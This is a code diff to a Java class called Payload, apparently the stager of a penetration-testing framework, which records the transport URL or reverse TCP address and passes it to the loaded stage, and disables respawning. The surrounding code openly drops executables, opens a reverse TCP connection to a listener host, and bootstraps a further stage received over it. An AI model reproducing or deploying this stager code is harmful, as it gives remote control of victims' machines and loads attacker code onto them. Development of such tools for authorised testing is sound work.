@@ -76,6 +76,8 @@ public class Payload extends ClassLoader {
             propsStream.close();
         }
 
+        String transport = null;
+
         // check if we should drop an executable
         String executableName = props.getProperty("Executable");
         if (executableName != null) {
@@ -90,7 +92,7 @@ public class Payload extends ClassLoader {
         }
 
         // check if we should respawn
-        int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
+        int spawn = 0;//Integer.parseInt(props.getProperty("Spawn", "0"));
         String droppedExecutable = props.getProperty("DroppedExecutable");
         if (spawn > 0) {
             // decrease count so that eventually the process
@@ -183,6 +185,7 @@ public class Payload extends ClassLoader {
                 in = System.in;
                 out = System.out;
             } else if (url != null) {
+                transport = url;
                 if (url.startsWith("raw:"))
                     // for debugging: just use raw bytes from property file
                     in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
@@ -198,6 +201,7 @@ public class Payload extends ClassLoader {
             } else {
                 Socket socket;
                 if (lHost != null) {
+                    transport = "tcp://" + lHost + ":" + lPort;
                     // reverse_tcp
                     socket = new Socket(lHost, lPort);
                 } else {
@@ -221,8 +225,9 @@ public class Payload extends ClassLoader {
 
             // build the stage parameters, if any
             StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- " + props.getProperty("StageParameters", ""), " ");
-            String[] stageParams = new String[stageParamTokenizer.countTokens()];
-            for (int i = 0; i < stageParams.length; i++) {
+            String[] stageParams = new String[stageParamTokenizer.countTokens() + 1];
+            stageParams[0] = transport;
+            for (int i = 1; i < stageParams.length; i++) {
                 stageParams[i] = stageParamTokenizer.nextToken();
             }
             new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
